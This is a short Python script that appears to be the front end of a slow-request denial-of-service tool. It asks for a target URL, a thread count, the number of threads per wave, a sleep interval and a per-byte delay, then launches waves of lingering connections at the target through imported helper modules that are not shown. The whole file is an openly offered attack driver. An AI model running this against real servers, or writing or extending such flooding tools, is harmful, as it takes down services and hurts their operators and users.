from core.connectioin import numberConnection
from core.interval import timeload
from util.translateHost import parse_url


def attack(number_of_threads, sleep_time, thread_per_time,host, port, path, request_delay):

    if thread_per_time == 0:
        if number_of_threads > 0:
            numberConnection(number_of_threads,host, port, path, request_delay)
        print("Attack finished!")
        return

    while number_of_threads > 0:
        print("Attack started...")

        launch_attack = min(thread_per_time, number_of_threads)
        numberConnection(launch_attack,host, port, path, request_delay)

        number_of_threads -= launch_attack

        if number_of_threads <= 0:
            break

        timeload(sleep_time)

    print("Attack finished!")



n_threads = int(input("Enter the total number of threads: "))
s_time = int(input("Enter the sleep time between attacks (in seconds): "))
t_per_time = int(input("Enter the number of threads to launch per attack: "))
# host = input("Enter the target host: ")
# port = int(input("Enter the target port: "))
# path = input("Enter the request path: ")
url = input("Enter the target URL (e.g., http://example.com/path): ")
host, port, path = parse_url(url)
request_delay = float(input("Enter the delay between bytes (in seconds): "))
attack(n_threads, s_time, t_per_time, host, port, path, request_delay)
    